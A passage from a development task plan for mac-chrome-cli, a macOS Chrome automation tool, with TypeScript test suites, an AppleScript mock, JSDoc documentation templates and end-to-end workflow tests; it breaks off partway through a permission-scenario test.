**Description**: Add comprehensive failure scenario tests with realistic AppleScript mocks and concurrent operation testing
**Size**: Large
**Priority**: High
**Dependencies**: Task 2.3
**Can run parallel with**: Task 3.2

**Technical Requirements**:
- Add comprehensive error condition testing for all critical failure modes
- Implement realistic AppleScript mocks that match actual error patterns
- Add concurrent operation testing to verify thread safety and resource handling
- Achieve 85%+ test coverage with meaningful tests that can fail
- Follow project principle: "When tests fail, fix the code, not the test"

**Implementation**:

1. Create comprehensive error scenario tests:
```typescript
// test/integration/error-scenarios.test.ts
describe('Comprehensive Error Handling', () => {
  describe('Permission Failures', () => {
    it('should handle Chrome running but AppleScript denied', async () => {
      // Setup: Chrome is running
      mockChromeDetection.mockResolvedValue(true);
      
      // Setup: AppleScript permission denied
      mockAppleScriptExecution.mockRejectedValue(
        new PermissionError('Not authorized to send Apple events', ERROR_CODES.PERMISSION_DENIED)
      );
      
      // Execute command that requires AppleScript
      const result = await captureSnapshot({ visibleOnly: true });
      
      // Verify proper error handling
      expect(result.kind).toBe('error');
      expect(result.code).toBe(ERROR_CODES.PERMISSION_DENIED);
      expect(result.error).toContain('AppleScript permission required');
      
      // Verify recovery suggestion provided
      expect(result.error).toContain('System Preferences');
    });
    
    it('should handle partial permissions (automation yes, screen recording no)', async () => {
      // Setup: Automation allowed, screen recording denied
      mockPermissionCheck.mockResolvedValue({
        appleScript: true,
        automation: true,
        screenRecording: false,
        accessibility: true
      });
      
      // Execute screenshot command
      const result = await captureScreenshot({ type: 'viewport' });
      
      // Verify specific error for missing screen recording permission
      expect(result.kind).toBe('error');
      expect(result.code).toBe(ERROR_CODES.PERMISSION_DENIED);
      expect(result.error).toContain('Screen recording permission');
    });
    
    it('should handle Chrome accessibility permission denied', async () => {
      // Test Chrome-specific accessibility issues
      const appleScript = `
        tell application "Google Chrome"
          get title of tab 1 of window 1
        end tell
      `;
      
      mockAppleScriptExecution.mockRejectedValue(
        new Error('execution error: Not authorized to send Apple events to Google Chrome. (-1743)')
      );
      
      const result = await executeAppleScript(appleScript);
      
      expect(result.kind).toBe('error');
      expect(result.code).toBe(ERROR_CODES.PERMISSION_DENIED);
      expect(result.error).toContain('Chrome automation permission');
    });
  });
  
  describe('Timeout and Network Failures', () => {
    it('should handle AppleScript timeout during long operations', async () => {
      // Setup: Long-running operation that times out
      const operation = executeWithTimeout('complex operation', 5000);
      
      // Simulate timeout after 5 seconds
      jest.advanceTimersByTime(5001);
      
      const result = await operation;
      expect(result.kind).toBe('error');
      expect(result.code).toBe(ERROR_CODES.TIMEOUT);
      expect(result.error).toContain('Operation timed out after 5000ms');
    });
    
    it('should handle network timeout during page load', async () => {
      // Setup: Network request that times out
      mockNetworkRequest.mockImplementation(() => 
        new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Network timeout')), 30001)
        )
      );
      
      const result = await navigateToUrl('https://slow-website.com');
      
      expect(result.kind).toBe('error');
      expect(result.code).toBe(ERROR_CODES.NETWORK_TIMEOUT);
    });
    
    it('should handle intermittent Chrome connection failures', async () => {
      // Setup: Chrome connection fails intermittently
      let attemptCount = 0;
      mockAppleScriptExecution.mockImplementation(() => {
        attemptCount++;
        if (attemptCount < 3) {
          throw new Error('Chrome connection failed');
        }
        return Promise.resolve('success');
      });
      
      // Execute with retry logic
      const result = await executeWithRetry(() => captureSnapshot({}));
      
      // Should succeed after retries
      expect(result.kind).toBe('ok');
      expect(attemptCount).toBe(3);
    });
  });
  
  describe('Resource and State Conflicts', () => {
    it('should handle concurrent screenshot operations', async () => {
      // Setup: Multiple screenshot operations at once
      const operations = Array(5).fill(0).map((_, i) => 
        captureScreenshot({ type: 'viewport', outputPath: `/tmp/screenshot-${i}.png` })
      );
      
      // Execute all operations concurrently
      const results = await Promise.allSettled(operations);
      
      // Verify all operations complete (some may fail due to resource conflicts)
      results.forEach(result => {
        expect(result.status).toBeDefined();
        if (result.status === 'fulfilled') {
          expect(result.value.kind).toBe('ok');
        } else {
          // If failed, should be due to resource conflict, not system error
          expect(result.reason).not.toMatch(/system error|undefined/i);
        }
      });
    });
    
    it('should handle resource exhaustion gracefully', async () => {
      // Setup: Create many operations that consume resources
      const operations = Array(20).fill(0).map(() => 
        executeAppleScript('tell application "System Events" to get processes')
      );
      
      const results = await Promise.allSettled(operations);
      
      // System should handle resource limits gracefully
      const failed = results.filter(r => r.status === 'rejected');
      if (failed.length > 0) {
        failed.forEach(failure => {
          expect(failure.reason.code).toBeOneOf([
            ERROR_CODES.RESOURCE_LIMIT_EXCEEDED,
            ERROR_CODES.TIMEOUT,
            ERROR_CODES.SYSTEM_ERROR
          ]);
        });
      }
    });
  });
  
  describe('Data Integrity and Edge Cases', () => {
    it('should handle malformed AppleScript responses', async () => {
      // Setup: AppleScript returns malformed data
      mockAppleScriptExecution.mockResolvedValue('invalid json {{{');
      
      const result = await executeJavaScript('document.title');
      
      expect(result.kind).toBe('error');
      expect(result.code).toBe(ERROR_CODES.DATA_PARSING_ERROR);
    });
    
    it('should handle extremely large response data', async () => {
      // Setup: Very large response that might cause memory issues
      const largeData = 'x'.repeat(10 * 1024 * 1024); // 10MB string
      mockAppleScriptExecution.mockResolvedValue(largeData);
      
      const result = await capturePageContent();
      
      // Should handle large data gracefully (truncate or stream)
      if (result.kind === 'ok') {
        expect(result.value.length).toBeLessThan(5 * 1024 * 1024); // Should be truncated
      } else {
        expect(result.code).toBe(ERROR_CODES.DATA_TOO_LARGE);
      }
    });
    
    it('should handle special characters in selectors and inputs', async () => {
      // Test special characters that might break AppleScript string escaping
      const problemSelectors = [
        '#element-with"quotes',
        "[data-test='value with \\'escapes']",
        '\\complex\\backslash\\selector',
        'input[placeholder="Enter \\"quoted\\" text"]'
      ];
      
      for (const selector of problemSelectors) {
        const result = await clickElement(selector);
        
        // Should either succeed or fail gracefully (not crash)
        if (result.kind === 'error') {
          expect(result.code).toBeOneOf([
            ERROR_CODES.INVALID_SELECTOR,
            ERROR_CODES.TARGET_NOT_FOUND
          ]);
          expect(result.error).not.toMatch(/script error|syntax error/i);
        }
      }
    });
  });
});
```

2. Create realistic AppleScript mock system:
```typescript
// test/mocks/AppleScriptMock.ts
export class RealisticAppleScriptMock {
  private readonly realErrorPatterns = [
    {
      trigger: /window 999/,
      error: 'execution error: Can\'t get window 999 of application "Google Chrome". Invalid index. (-1719)',
      code: ERROR_CODES.TARGET_NOT_FOUND
    },
    {
      trigger: /tab 999/,
      error: 'execution error: Can\'t get tab 999 of window 1 of application "Google Chrome". Invalid index. (-1719)',
      code: ERROR_CODES.TARGET_NOT_FOUND
    },
    {
      trigger: /not authorized/,
      error: 'execution error: Not authorized to send Apple events to Google Chrome. (-1743)',
      code: ERROR_CODES.PERMISSION_DENIED
    },
    {
      trigger: /Application isn't running/,
      error: 'execution error: Google Chrome got an error: Application isn\'t running. (-600)',
      code: ERROR_CODES.CHROME_NOT_RUNNING
    },
    {
      trigger: /timeout after \d+/,
      error: 'execution error: The operation couldn\'t be completed. Timeout after 30 seconds.',
      code: ERROR_CODES.TIMEOUT
    }
  ];
  
  async execute(script: string): Promise<Result<string>> {
    // Simulate realistic timing (50-200ms)
    await this.simulateExecutionTime();
    
    // Check for error patterns first
    for (const pattern of this.realErrorPatterns) {
      if (pattern.trigger.test(script)) {
        return Result.error(new Error(pattern.error), pattern.code);
      }
    }
    
    // Simulate realistic Chrome responses
    if (script.includes('get title of tab')) {
      return Result.ok(this.generateMockTitle());
    }
    
    if (script.includes('execute javascript')) {
      return this.simulateJavaScriptExecution(script);
    }
    
    if (script.includes('get bounds of window')) {
      return Result.ok(JSON.stringify({ x: 100, y: 100, width: 1200, height: 800 }));
    }
    
    // Default successful response
    return Result.ok('success');
  }
  
  private async simulateExecutionTime(): Promise<void> {
    // Realistic AppleScript execution timing with some variance
    const baseTime = 50;
    const variance = Math.random() * 150;
    const delay = baseTime + variance;
    await new Promise(resolve => setTimeout(resolve, delay));
  }
  
  private generateMockTitle(): string {
    const titles = [
      'Example Domain',
      'Google',
      'GitHub',
      'Stack Overflow - Where Developers Learn',
      'localhost:3000'
    ];
    return titles[Math.floor(Math.random() * titles.length)];
  }
  
  private async simulateJavaScriptExecution(script: string): Promise<Result<string>> {
    // Extract JavaScript from AppleScript
    const jsMatch = script.match(/execute javascript "(.+?)"/);
    if (!jsMatch) return Result.error('Invalid JavaScript in AppleScript', ERROR_CODES.INVALID_INPUT);
    
    const js = jsMatch[1].replace(/\\"/g, '"');
    
    // Simulate common JavaScript responses
    if (js.includes('document.title')) {
      return Result.ok('"Example Page Title"');
    }
    
    if (js.includes('document.querySelector')) {
      // Simulate element found/not found
      return Math.random() > 0.3 
        ? Result.ok('{"tagName":"div","id":"example","className":"test"}')
        : Result.ok('null');
    }
    
    if (js.includes('document.querySelectorAll')) {
      // Simulate multiple elements
      const count = Math.floor(Math.random() * 5);
      const elements = Array(count).fill(0).map((_, i) => `{"id":"element-${i}"}`);
      return Result.ok(`[${elements.join(',')}]`);
    }
    
    // Default JavaScript response
    return Result.ok('true');
  }
  
  // Method to configure specific responses for tests
  setResponse(trigger: RegExp, response: string): void {
    // Allow tests to configure specific responses
  }
  
  setError(trigger: RegExp, error: Error, code: ErrorCode): void {
    // Allow tests to configure specific errors
  }
}

// Integration with Jest
export function setupRealisticAppleScriptMocks(): RealisticAppleScriptMock {
  const mock = new RealisticAppleScriptMock();
  
  jest.mocked(execWithTimeout).mockImplementation(async (command, args, timeout) => {
    if (command === 'osascript' && args[0] === '-e') {
      const script = args[1];
      const result = await mock.execute(script);
      
      return result.kind === 'ok'
        ? { success: true, stdout: result.value, stderr: '', exitCode: 0, duration: 100, command: 'osascript' }
        : { success: false, stdout: '', stderr: String(result.error), exitCode: 1, duration: 100, command: 'osascript' };
    }
    
    // Default mock behavior for other commands
    return { success: true, stdout: 'mock output', stderr: '', exitCode: 0, duration: 50, command };
  });
  
  return mock;
}
```

3. Add concurrent operation tests:
```typescript
// test/integration/concurrent-operations.test.ts
describe('Concurrent Operation Safety', () => {
  beforeEach(() => {
    setupRealisticAppleScriptMocks();
  });
  
  it('should handle concurrent coordinate calculations without resource conflicts', async () => {
    // Setup: Multiple coordinate calculation operations
    const operations = Array.from({ length: 50 }, (_, i) => ({
      selector: `#element-${i}`,
      expectedX: 100 + i,
      expectedY: 200 + i
    }));
    
    // Mock responses with consistent but unique data
    operations.forEach((op, i) => {
      mockAppleScript.setResponse(
        new RegExp(`querySelector.*#element-${i}`),
        JSON.stringify({
          getBoundingClientRect: () => ({
            x: op.expectedX, 
            y: op.expectedY, 
            width: 100, 
            height: 30
          })
        })
      );
    });
    
    // Execute all operations concurrently
    const results = await Promise.allSettled(
      operations.map(op => selectorToScreen(op.selector, 1))
    );
    
    // Verify all succeeded with correct data
    results.forEach((result, i) => {
      expect(result.status).toBe('fulfilled');
      if (result.status === 'fulfilled') {
        expect(result.value.kind).toBe('ok');
        if (result.value.kind === 'ok') {
          expect(result.value.value.coordinates?.x).toBe(operations[i].expectedX + 100); // +100 from mock window offset
          expect(result.value.value.coordinates?.y).toBe(operations[i].expectedY + 124); // +124 from mock window + title bar
        }
      }
    });
    
    // Verify cache performance during concurrent operations
    const cacheStats = getCacheStatistics();
    expect(cacheStats.hitRate).toBeGreaterThan(0.1); // Some cache hits expected
    expect(cacheStats.totalRequests).toBe(operations.length * 2); // Element + viewport calls
  });
  
  it('should handle concurrent AppleScript operations with proper queuing', async () => {
    // Setup: Multiple AppleScript operations that could conflict
    const operations = Array.from({ length: 10 }, (_, i) => 
      executeAppleScript(`tell application "Google Chrome" to get title of tab ${i + 1} of window 1`)
    );
    
    // Execute all concurrently
    const results = await Promise.allSettled(operations);
    
    // Verify proper handling (either success or controlled failure)
    results.forEach((result, i) => {
      expect(result.status).toBe('fulfilled');
      if (result.status === 'fulfilled') {
        if (result.value.kind === 'error') {
          // If failed, should be due to valid reasons, not system crashes
          expect(result.value.code).toBeOneOf([
            ERROR_CODES.TARGET_NOT_FOUND, // Tab doesn't exist
            ERROR_CODES.TIMEOUT, // Resource contention
            ERROR_CODES.CHROME_CONNECTION_FAILED // Too many concurrent connections
          ]);
        }
      }
    });
    
    // At least some operations should succeed
    const successful = results.filter(r => 
      r.status === 'fulfilled' && r.value.kind === 'ok'
    );
    expect(successful.length).toBeGreaterThan(2);
  });
  
  it('should handle concurrent network monitoring without data corruption', async () => {
    // Setup: Multiple network monitoring sessions
    const sessions = Array.from({ length: 5 }, (_, i) => 
      startNetworkMonitoring({ maxEvents: 100, sessionId: `test-${i}` })
    );
    
    // Start all sessions
    const startResults = await Promise.allSettled(sessions);
    
    // Simulate network activity
    await Promise.all([
      navigateToUrl('https://example1.com'),
      navigateToUrl('https://example2.com'),
      navigateToUrl('https://example3.com')
    ]);
    
    // Stop all sessions and collect data
    const stopResults = await Promise.allSettled(
      startResults.map((_, i) => stopNetworkMonitoring(`test-${i}`))
    );
    
    // Verify data integrity
    stopResults.forEach((result, i) => {
      if (result.status === 'fulfilled' && result.value.kind === 'ok') {
        const events = result.value.value.events;
        
        // Each session should have captured some events
        expect(events.length).toBeGreaterThan(0);
        
        // Events should not be corrupted or duplicated across sessions
        events.forEach(event => {
          expect(event).toHaveProperty('url');
          expect(event).toHaveProperty('timestamp');
          expect(event.sessionId).toBe(`test-${i}`);
        });
      }
    });
  });
});
```

**Acceptance Criteria**:
- [ ] Comprehensive error condition tests for all critical failure modes
- [ ] Realistic AppleScript mocks that match actual macOS error patterns and timing
- [ ] Concurrent operation tests verify thread safety and resource handling
- [ ] Test coverage reaches 85%+ with meaningful tests that can actually fail
- [ ] Tests follow project principle: failures indicate real bugs, not test issues
- [ ] Error recovery scenarios tested for all recoverable error types
- [ ] Performance impact of concurrent operations documented and validated
- [ ] All existing functionality preserved while improving test coverage

### Task 3.2: Enhance JSDoc Documentation Coverage to 90%+
**Description**: Add comprehensive JSDoc documentation to all public APIs with usage examples and error condition documentation
**Size**: Medium
**Priority**: Medium
**Dependencies**: None
**Can run parallel with**: Task 3.1

**Technical Requirements**:
- Achieve 90%+ JSDoc coverage for all public APIs
- Include usage examples for every public method and complex function
- Document all error conditions with recovery guidance
- Add TypeScript interface documentation
- Create comprehensive API reference documentation
- Integrate with IDE support for better developer experience

**Implementation**:

1. Create JSDoc standards and templates:
```typescript
// Documentation standards template
/**
 * Brief one-line description of what the function does
 * 
 * Longer description explaining the purpose, behavior, and any important details.
 * Include information about when to use this function and any gotchas.
 * 
 * @param paramName - Description of the parameter, including type constraints
 * @param options - Configuration options with detailed property descriptions
 * @param options.timeout - Timeout in milliseconds (default: 5000)
 * @param options.retries - Number of retry attempts (default: 3)
 * 
 * @returns Promise resolving to operation result with timing metadata
 * 
 * @throws {PermissionError} When AppleScript automation permission is denied
 * @throws {TimeoutError} When operation exceeds specified timeout
 * @throws {ValidationError} When input parameters fail validation
 * 
 * @example
 * ```typescript
 * // Basic usage
 * const result = await executeAppleScript('tell application "Chrome" to get title');
 * if (result.success) {
 *   console.log('Page title:', result.value);
 * }
 * 
 * // With options
 * const result = await executeAppleScript(script, {
 *   timeout: 10000,
 *   retries: 2,
 *   cacheTTL: 300
 * });
 * ```
 * 
 * @example
 * ```typescript
 * // Error handling
 * try {
 *   const result = await executeAppleScript(complexScript);
 *   if (!result.success) {
 *     if (result.code === ERROR_CODES.PERMISSION_DENIED) {
 *       console.log('Fix: Enable automation in System Preferences');
 *     }
 *   }
 * } catch (error) {
 *   console.error('Unexpected error:', error);
 * }
 * ```
 * 
 * @security This function executes AppleScript which has system-level access.
 * Ensure input scripts are validated and trusted.
 * 
 * @performance Caching enabled by default. First execution ~200ms, cached ~50ms.
 * 
 * @since 1.0.0
 */
```

2. Document all service interfaces:
```typescript
// src/services/interfaces/IAppleScriptService.ts
export interface IAppleScriptService {
  /**
   * Execute AppleScript with comprehensive caching and error handling
   * 
   * This method provides the core AppleScript execution functionality with built-in
   * caching, timeout handling, and permission validation. It's the foundation for
   * all browser automation operations in mac-chrome-cli.
   * 
   * @param script - The AppleScript code to execute. Must be syntactically valid AppleScript.
   * @param options - Execution configuration options
   * @param options.timeout - Execution timeout in milliseconds (default: 5000)
   * @param options.retries - Number of retry attempts for transient failures (default: 2)
   * @param options.cacheKey - Custom cache key for result caching (auto-generated if not provided)
   * @param options.cacheTTL - Cache time-to-live in seconds (default: 900 for script cache)
   * @param options.suppressErrors - Whether to suppress non-critical errors (default: false)
   * 
   * @returns Promise resolving to Result containing script output or error details
   * 
   * @throws Never throws - all errors are captured in Result type
   * 
   * @example
   * ```typescript
   * // Execute simple AppleScript
   * const service = container.resolve(TOKENS.AppleScriptService);
   * const result = await service.execute(`
   *   tell application "Google Chrome"
   *     get title of tab 1 of window 1
   *   end tell
   * `);
   * 
   * if (result.kind === 'ok') {
   *   console.log('Page title:', result.value);
   * } else {
   *   console.error('Error:', result.error);
   * }
   * ```
   * 
   * @example
   * ```typescript
   * // Execute with custom options
   * const result = await service.execute(complexScript, {
   *   timeout: 15000,
   *   retries: 3,
   *   cacheTTL: 60, // Cache for 1 minute
   *   suppressErrors: false
   * });
   * ```
   * 
   * @performance 
   * - First execution: ~200-500ms depending on script complexity
   * - Cached execution: ~10-50ms
   * - Cache hit rate typically 60-80% in normal usage
   * 
   * @security
   * - AppleScript has system-level access - validate all input scripts
   * - Automatic permission checking prevents execution without proper grants
   * - No script injection protection - caller must sanitize inputs
   */
  execute(script: string, options?: ExecutionOptions): Promise<Result<string>>;
  
  /**
   * Execute JavaScript in Chrome browser context with security validation
   * 
   * This method executes JavaScript code within a Chrome tab context, providing
   * a bridge between AppleScript automation and web page interaction. Includes
   * built-in security validation to prevent dangerous JavaScript patterns.
   * 
   * @param js - JavaScript code to execute. Subject to security validation.
   * @param context - Browser context specifying target tab and window
   * @param context.tabIndex - Chrome tab index (1-based, default: active tab)
   * @param context.windowIndex - Chrome window index (1-based, default: front window)  
   * @param context.validate - Whether to validate context before execution (default: true)
   * 
   * @returns Promise resolving to Result containing JavaScript execution result
   * 
   * @throws Never throws - all errors captured in Result type
   * 
   * @example
   * ```typescript
   * // Get page title
   * const result = await service.executeJavaScript<string>(
   *   'document.title',
   *   { tabIndex: 1, windowIndex: 1 }
   * );
   * 
   * if (result.kind === 'ok') {
   *   console.log('Title:', result.value);
   * }
   * ```
   * 
   * @example
   * ```typescript
   * // Get form data
   * const result = await service.executeJavaScript<Record<string, string>>(
   *   'Object.fromEntries(new FormData(document.querySelector("form")))',
   *   { tabIndex: 2 }
   * );
   * 
   * if (result.kind === 'ok') {
   *   console.log('Form data:', result.value);
   * }
   * ```
   * 
   * @security
   * - JavaScript is validated against dangerous patterns (eval, Function, etc.)
   * - No XSS protection - caller must ensure JavaScript is safe
   * - Executes in page context with full DOM access
   * 
   * @performance
   * - Execution time: ~100-300ms depending on JavaScript complexity
   * - Large result serialization may add 50-200ms
   * - Results over 1MB are truncated for performance
   */
  executeJavaScript<T = any>(js: string, context: BrowserContext): Promise<Result<T>>;
}
```

3. Document all command classes:
```typescript
// src/commands/snapshot.ts - Example of comprehensive command documentation
/**
 * Snapshot Command - Capture page structure and interactive elements
 * 
 * The snapshot command extracts structured information about web page elements,
 * focusing on interactive components like buttons, links, inputs, and form elements.
 * It provides two main modes: outline (flat list) and dom-lite (hierarchical tree).
 * 
 * This command is essential for:
 * - Understanding page structure for automation
 * - Finding interactive elements programmatically
 * - Building reliable element selectors
 * - Analyzing page accessibility and structure
 * 
 * @example
 * ```bash
 * # Basic outline capture
 * mac-chrome-cli snapshot outline
 * 
 * # Visible elements only
 * mac-chrome-cli snapshot outline --visible-only
 * 
 * # DOM hierarchy with depth limit
 * mac-chrome-cli snapshot dom-lite --max-depth 3
 * 
 * # JSON output for programmatic use
 * mac-chrome-cli snapshot outline --json
 * ```
 */
export class SnapshotCommand extends BaseCommand<SnapshotOptions, SnapshotData> {
  readonly name = 'snapshot';
  readonly description = 'Capture page structure and interactive elements';
  
  /**
   * Execute snapshot capture operation
   * 
   * Captures page structure by injecting JavaScript to traverse the DOM and
   * extract information about interactive elements. The operation respects
   * visibility filters and depth limits to provide focused results.
   * 
   * @param options - Snapshot configuration options
   * @param options.mode - Capture mode: 'outline' for flat list, 'dom-lite' for hierarchy
   * @param options.visibleOnly - Only capture visible elements (default: false)
   * @param options.maxDepth - Maximum DOM depth for dom-lite mode (default: unlimited)
   * @param options.includeText - Include element text content (default: true)
   * @param options.includeAttributes - Include element attributes (default: false)
   * 
   * @returns Promise resolving to captured page structure data
   * 
   * @example
   * ```typescript
   * const command = new SnapshotCommand(container);
   * const result = await command.execute({
   *   mode: 'outline',
   *   visibleOnly: true,
   *   includeText: true
   * });
   * 
   * if (result.kind === 'ok') {
   *   console.log(`Found ${result.value.elements.length} interactive elements`);
   *   result.value.elements.forEach(el => {
   *     console.log(`${el.role}: ${el.name} (${el.selector})`);
   *   });
   * }
   * ```
   * 
   * @performance
   * - Typical execution: 150-250ms for standard pages
   * - Large pages (>1000 elements): 300-500ms
   * - Visible-only filter reduces time by ~30%
   * 
   * @accessibility
   * Extracts ARIA roles and labels for accessibility analysis
   */
  async execute(options: SnapshotOptions): Promise<Result<SnapshotData>> {
    // Implementation...
  }
  
  /**
   * Generate JavaScript code for DOM traversal and element extraction
   * 
   * Creates optimized JavaScript that runs in the browser context to traverse
   * the DOM and extract structured information about interactive elements.
   * The generated script handles various edge cases and browser differences.
   * 
   * @param options - Snapshot options affecting script generation
   * @returns Optimized JavaScript code for browser execution
   * 
   * @private
   * @internal
   */
  private generateSnapshotScript(options: SnapshotOptions): string {
    // Implementation...
  }
}
```

4. Create automated documentation generation:
```typescript
// scripts/generate-docs.ts
/**
 * Automated Documentation Generator
 * 
 * Scans the codebase for JSDoc comments and generates comprehensive
 * API documentation in multiple formats (HTML, Markdown, JSON).
 */
import * as ts from 'typescript';
import * as fs from 'fs-extra';
import * as path from 'path';

interface DocEntry {
  name: string;
  description: string;
  parameters: ParameterDoc[];
  returns: string;
  examples: string[];
  throws: string[];
  since?: string;
  deprecated?: string;
}

class DocumentationGenerator {
  /**
   * Generate comprehensive API documentation
   * 
   * @param sourceDir - Source code directory to scan
   * @param outputDir - Output directory for generated documentation
   * @returns Promise resolving when documentation generation completes
   */
  async generate(sourceDir: string, outputDir: string): Promise<void> {
    const program = ts.createProgram([sourceDir], {
      target: ts.ScriptTarget.ES2022,
      moduleResolution: ts.ModuleResolutionKind.Node16
    });
    
    const sourceFiles = program.getSourceFiles()
      .filter(file => !file.isDeclarationFile && file.fileName.includes(sourceDir));
    
    const documentation: DocEntry[] = [];
    
    for (const sourceFile of sourceFiles) {
      this.extractDocumentation(sourceFile, documentation);
    }
    
    await this.generateMarkdownDocs(documentation, outputDir);
    await this.generateHTMLDocs(documentation, outputDir);
    await this.generateJSONDocs(documentation, outputDir);
  }
  
  private extractDocumentation(sourceFile: ts.SourceFile, docs: DocEntry[]): void {
    // Extract JSDoc comments and generate documentation entries
    ts.forEachChild(sourceFile, node => {
      if (this.isDocumentableNode(node)) {
        const doc = this.extractNodeDocumentation(node);
        if (doc) docs.push(doc);
      }
    });
  }
}
```

**Acceptance Criteria**:
- [ ] JSDoc coverage reaches 90%+ for all public APIs
- [ ] Every public method includes practical usage examples
- [ ] All error conditions documented with recovery guidance
- [ ] TypeScript interfaces have comprehensive property documentation
- [ ] Generated API documentation includes searchable HTML and Markdown formats
- [ ] IDE integration provides helpful tooltips and autocomplete information
- [ ] Documentation includes performance characteristics and security considerations
- [ ] All examples are tested and verified to work correctly

## Phase 4: Polish and Validation (Week 6)

### Task 4.1: Implement Integration Testing and Security Scanning
**Description**: Add comprehensive end-to-end integration testing with cross-command validation and automated security vulnerability scanning
**Size**: Large
**Priority**: Medium
**Dependencies**: Task 3.1, Task 3.2
**Can run parallel with**: Task 4.2

**Technical Requirements**:
- Full end-to-end testing of complete user workflows
- Cross-command integration testing to verify command interactions
- Permission scenario testing for all macOS permission combinations
- Automated security vulnerability scanning with CI integration
- Performance regression testing with benchmark validation

**Implementation**:

1. Create comprehensive end-to-end test suite:
```typescript
// test/e2e/complete-workflows.test.ts
describe('Complete User Workflows', () => {
  beforeAll(async () => {
    // Setup test environment with real Chrome instance
    await setupTestChrome();
    await validatePermissions();
  });
  
  afterAll(async () => {
    await cleanupTestChrome();
  });
  
  describe('Web Development Workflow', () => {
    it('should complete full development workflow: navigate → inspect → modify → test', async () => {
      // Step 1: Navigate to test page
      const navResult = await runCommand('nav', ['go', '--url', 'http://localhost:3000/test']);
      expect(navResult.success).toBe(true);
      
      // Step 2: Capture page snapshot
      const snapshotResult = await runCommand('snapshot', ['outline', '--visible-only']);
      expect(snapshotResult.success).toBe(true);
      expect(snapshotResult.data.elements.length).toBeGreaterThan(5);
      
      // Step 3: Take screenshot for baseline
      const screenshotResult = await runCommand('shot', ['viewport', '--out', '/tmp/baseline.png']);
      expect(screenshotResult.success).toBe(true);
      expect(fs.existsSync('/tmp/baseline.png')).toBe(true);
      
      // Step 4: Modify page content via JavaScript
      const jsResult = await runCommand('dom', ['eval', '--js', 'document.title = "Modified Title"']);
      expect(jsResult.success).toBe(true);
      
      // Step 5: Verify modification
      const titleResult = await runCommand('dom', ['eval', '--js', 'document.title']);
      expect(titleResult.success).toBe(true);
      expect(titleResult.data.result).toBe('Modified Title');
      
      // Step 6: Take screenshot after modification
      const afterResult = await runCommand('shot', ['viewport', '--out', '/tmp/after.png']);
      expect(afterResult.success).toBe(true);
      
      // Verify workflow completed successfully
      expect(fs.existsSync('/tmp/baseline.png')).toBe(true);
      expect(fs.existsSync('/tmp/after.png')).toBe(true);
    });
    
    it('should complete form testing workflow: navigate → fill → submit → verify', async () => {
      // Navigate to form page
      await runCommand('nav', ['go', '--url', 'http://localhost:3000/form-test']);
      
      // Wait for page load
      await runCommand('wait', ['--ms', '2000']);
      
      // Fill form fields
      const fillResults = await Promise.all([
        runCommand('input', ['fill', '--selector', '#name', '--value', 'Test User']),
        runCommand('input', ['fill', '--selector', '#email', '--value', 'test@example.com']),
        runCommand('input', ['fill', '--selector', '#message', '--value', 'This is a test message'])
      ]);
      
      fillResults.forEach(result => expect(result.success).toBe(true));
      
      // Upload test file
      const uploadResult = await runCommand('files', ['upload', '--selector', '#file-input', '--path', '/tmp/test-document.pdf']);
      expect(uploadResult.success).toBe(true);
      
      // Submit form
      const submitResult = await runCommand('mouse', ['click', '--selector', 'button[type=submit]']);
      expect(submitResult.success).toBe(true);
      
      // Wait for submission
      await runCommand('wait', ['--ms', '3000']);
      
      // Verify success message
      const successResult = await runCommand('dom', ['eval', '--js', 'document.querySelector(".success-message")?.textContent']);
      expect(successResult.success).toBe(true);
      expect(successResult.data.result).toContain('success');
    });
  });
  
  describe('Debugging and Analysis Workflow', () => {
    it('should complete debugging workflow: network monitoring → error detection → analysis', async () => {
      // Start network monitoring
      const netStartResult = await runCommand('netlog', ['start', '--max-events', '500']);
      expect(netStartResult.success).toBe(true);
      
      // Navigate to page that makes API calls
      await runCommand('nav', ['go', '--url', 'http://localhost:3000/api-test']);
      
      // Wait for network activity
      await runCommand('wait', ['--ms', '5000']);
      
      // Trigger API calls via JavaScript
      await runCommand('dom', ['eval', '--js', 'fetch("/api/test").then(r => r.json())']);
      await runCommand('wait', ['--ms', '2000']);
      
      // Capture network events
      const netDumpResult = await runCommand('netlog', ['dump', '--format', 'json']);
      expect(netDumpResult.success).toBe(true);
      expect(netDumpResult.data.events.length).toBeGreaterThan(1);
      
      // Verify API calls captured
      const apiCalls = netDumpResult.data.events.filter(event => event.url.includes('/api/'));
      expect(apiCalls.length).toBeGreaterThan(0);
      
      // Stop monitoring
      const netStopResult = await runCommand('netlog', ['stop']);
      expect(netStopResult.success).toBe(true);
      
      // Export to HAR format
      const exportResult = await runCommand('netlog', ['dump', '--format', 'har']);
      expect(exportResult.success).toBe(true);
      expect(exportResult.data.log.entries.length).toBeGreaterThan(0);
    });
  });
  
  describe('Cross-Command Integration', () => {
    it('should coordinate multiple commands for complex automation', async () => {
      // Use snapshot to find elements, then interact with them
      const snapshotResult = await runCommand('snapshot', ['outline', '--json']);
      expect(snapshotResult.success).toBe(true);
      
      const buttons = snapshotResult.data.elements.filter(el => el.role === 'button');
      expect(buttons.length).toBeGreaterThan(0);
      
      // Click each button and verify response
      for (const button of buttons.slice(0, 3)) { // Test first 3 buttons
        // Take screenshot before
        const beforePath = `/tmp/before-${button.name}.png`;
        await runCommand('shot', ['element', '--selector', button.selector, '--out', beforePath]);
        
        // Click button
        const clickResult = await runCommand('mouse', ['click', '--selector', button.selector]);
        
        if (clickResult.success) {
          // Wait for potential changes
          await runCommand('wait', ['--ms', '1000']);
          
          // Take screenshot after
          const afterPath = `/tmp/after-${button.name}.png`;
          await runCommand('shot', ['element', '--selector', button.selector, '--out', afterPath]);
          
          // Verify screenshots exist
          expect(fs.existsSync(beforePath)).toBe(true);
          expect(fs.existsSync(afterPath)).toBe(true);
        }
      }
    });
  });
});
```

2. Create permission scenario testing:
```typescript
// test/e2e/permission-scenarios.test.ts
describe('Permission Scenarios', () => {
  const permissionStates = [
    { name: 'Full Access', applescript: true, automation: true, screenRecording: true, accessibility: true },
    { name: 'No AppleScript', applescript: false, automation: true, screenRecording: true, accessibility: true },
    { name: 'No Automation', applescript: true, automation: false, screenRecording: true, accessibility: true },
    { name: 'No Screen Recording', applescript: true, automation: true, screenRecording: false, accessibility: true },
    { name: 'No Accessibility', applescript: true, automation: true, screenRecording: true, accessibility: false },
    { name: 'Minimal Access', applescript: true, automation: false, screenRecording: false, accessibility: false }
  ];
  
  permissionStates.forEach(state => {
    describe(`Permission State: ${state.name}`, () => {
      beforeEach(() => {
        mockPermissionState(state);
      });
      
      it('should handle doctor command appropriately', async () => {
        const result = await runCommand('doctor', []);
        
